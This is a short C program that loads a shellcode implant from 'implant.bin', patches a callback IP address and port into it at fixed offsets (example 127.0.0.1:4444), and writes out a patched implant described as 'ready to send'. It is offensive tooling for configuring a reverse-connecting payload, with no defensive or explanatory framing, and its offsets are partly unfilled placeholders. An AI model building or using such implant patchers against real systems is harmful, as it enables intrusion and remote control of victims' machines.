#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

// Offsets of IP and port in the shellcode binary (adjust as needed)
#define IP_OFFSET 0x150  // Replace 0xXYZ with actual offset of 'ip' in shellcode
#define PORT_OFFSET 0xABC // Replace 0xABC with actual offset of 'port' in shellcode

void patch_shellcode(uint8_t *shellcode, size_t size, uint32_t ip, uint16_t port) {
    // Patch IP (network byte order)
    *(uint32_t *)(shellcode + IP_OFFSET) = ip;

    // Patch port (network byte order)
    *(uint16_t *)(shellcode + PORT_OFFSET) = port;
}

int main() {
    FILE *f = fopen("implant.bin", "rb");
    if (!f) {
        perror("Failed to open shellcode file");
        return 1;
    }

    fseek(f, 0, SEEK_END);
    size_t size = ftell(f);
    rewind(f);

    uint8_t *shellcode = malloc(size);
    if (!shellcode) {
        perror("Malloc failed");
        fclose(f);
        return 1;
    }

    fread(shellcode, 1, size, f);
    fclose(f);

    // Example IP and port to patch (127.0.0.1:4444)
    uint32_t ip = 0x0100007F;       // 127.0.0.1 in network byte order
    uint16_t port = 0x5c11;         // Port 4444 in network byte order

    patch_shellcode(shellcode, size, ip, port);

    // Now shellcode contains the patched implant ready to send
    // For example, send it over a socket or write to a file

    // For demonstration, write patched shellcode to file
    FILE *out = fopen("implant_patched.bin", "wb");
    if (!out) {
        perror("Failed to open output file");
        free(shellcode);
        return 1;
    }
    fwrite(shellcode, 1, size, out);
    fclose(out);

    free(shellcode);
    printf("Patched shellcode written to implant_patched.bin\n");
    return 0;
}
